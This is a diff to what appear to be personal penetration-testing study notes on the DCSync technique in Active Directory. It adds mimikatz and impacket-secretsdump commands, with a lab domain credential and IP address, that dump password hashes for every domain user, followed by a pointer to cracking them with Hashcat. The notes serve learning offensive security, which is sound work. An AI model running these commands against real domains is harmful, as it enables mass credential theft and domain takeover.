@@ -1,3 +1,4 @@
+public:: true
 alias:: Domain Controller Synchronization
 
 - Since the Domain Controller is a critical part of the AD infrastructure it's important to add redundancy. That can be acomplished by running multiple DC instances *(or replicas)* within the same domain.
@@ -28,7 +29,12 @@ alias:: Domain Controller Synchronization
 			- ```
 			  lsadump::dcsync /user:corp\dave
 			  ```
-			-
+			- Request password-hashes for all the users in the domain
+				- ```mimikatz
+				  lsadump::dcsync /domain:test.com /all /csv
+				  ```
+				- TODO need to test this command
+				  background-color:: pink
 	- From Linux
 		- With [[Impacket-secretsdump]]
 			- ```bash
@@ -36,6 +42,12 @@ alias:: Domain Controller Synchronization
 			  	-just-dc-user dave \
 			      corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
 			  ```
+			- Request password-hashes for all the user in the domain
+				- ```bash
+				  impacket-secretsdump \
+				  	-just-dc-ntlm \
+				      corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+				  ```
 - Crack retrieved hashes
 	- With [[Hashcat]]
 		- id:: 65a00895-d0d1-4168-9b92-6dfa7401d3d7
